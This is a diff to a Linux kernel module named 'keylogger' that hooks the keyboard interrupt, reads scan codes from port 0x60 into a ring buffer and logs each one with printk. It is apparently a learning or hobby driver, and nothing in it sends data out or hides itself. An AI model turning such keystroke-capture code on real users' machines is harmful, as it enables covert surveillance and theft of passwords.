@@ -1,7 +1,5 @@
 #include "keyboard.h"
 
-# define SIZE	1000
-
 static char *id = "keyboard";
 
 static unsigned int scan_array[SIZE];
@@ -19,23 +17,27 @@ static struct miscdevice keylogger_misc = {
 };
 
 /* Assumption : if windex overrun rindex then static size is too small  */
+/* To be revised */
 
 static void do_tasklet(unsigned long unused)
 {
 	unsigned int packet = 0;
-	unsigned int target = 0;
+	unsigned int target = 0; 
 
-	while ((target = (windex > rindex) ? windex : SIZE)
-		&& rindex <= target)
+	target = (windex >= rindex) ? windex : SIZE;
+	while (rindex <= target)
 	{
 		read_lock(&keyboard_rwlock);
 		packet = scan_array[rindex++];
+		/*packet = scan_array[windex]; */
 		read_unlock(&keyboard_rwlock);
 		printk(KERN_INFO "tasklet : [%x]\n", packet);
-		rindex = (rindex == SIZE) ? 0 : rindex;
+		if (!(rindex = (rindex == SIZE) ? 0 : rindex))
+			target = windex;
+		/* state machine
+		 *  if SUCCESS, format packet and send it to buffer
+		 */
 	}
-	/* void spin_lock_irqsave(spinock_t *lock, unsigned long flags) */
-	/* void spin_unlock_irqrestore(spinlock_t *lock, unsigned long flags) */
 }
 DECLARE_TASKLET(keyboard_tasklet, do_tasklet, 0);
 
@@ -48,7 +50,7 @@ irqreturn_t	keyboard_interrupt(int irq, void *dev_id)
 
 	/* clearing bit for interrupts ? */
 	/* get time of day */
-	scan_code = inb(0x60);
+	scan_code = inb(KEYBOARD_PORT);
 	if (scan_code) {
 		/* format packet */
 		if (windex + 1 >= SIZE)
@@ -63,7 +65,11 @@ irqreturn_t	keyboard_interrupt(int irq, void *dev_id)
 
 static int __init keylogger_init(void)
 {
-	int	result;
+	int		result;
+/*	unsigned int	r; */
+	unsigned int	try = 0;
+	unsigned int	scan_set = 0;
+
 
 	result = misc_register(&keylogger_misc);
 	if (result) {
@@ -80,12 +86,23 @@ static int __init keylogger_init(void)
 		
 		goto err;
 	}
-
+	
+	/* Read Status Byte or IRQ ? */
+/*	outb(SCAN_SET, KEYBOARD_PORT);
+	r = inb(KEYBOARD_PORT);
+	printk(KERN_INFO "after SCAN_SET, caught [%x]\n", r);
+	outb(SCAN_SET_DATA, KEYBOARD_PORT);
+	r = inb(KEYBOARD_PORT);
+	printk(KERN_INFO "after SCAN_SET_DATA, caught [%x]\n", r);
+	r = inb(KEYBOARD_PORT);
+	printk(KERN_INFO "caught [%x]\n", r);
+*/
+	
 	return result;
-
 
 err:
 	misc_deregister(&keylogger_misc);
+	free_irq(KEYBOARD_IRQ, id);
 	return result;
 }
 
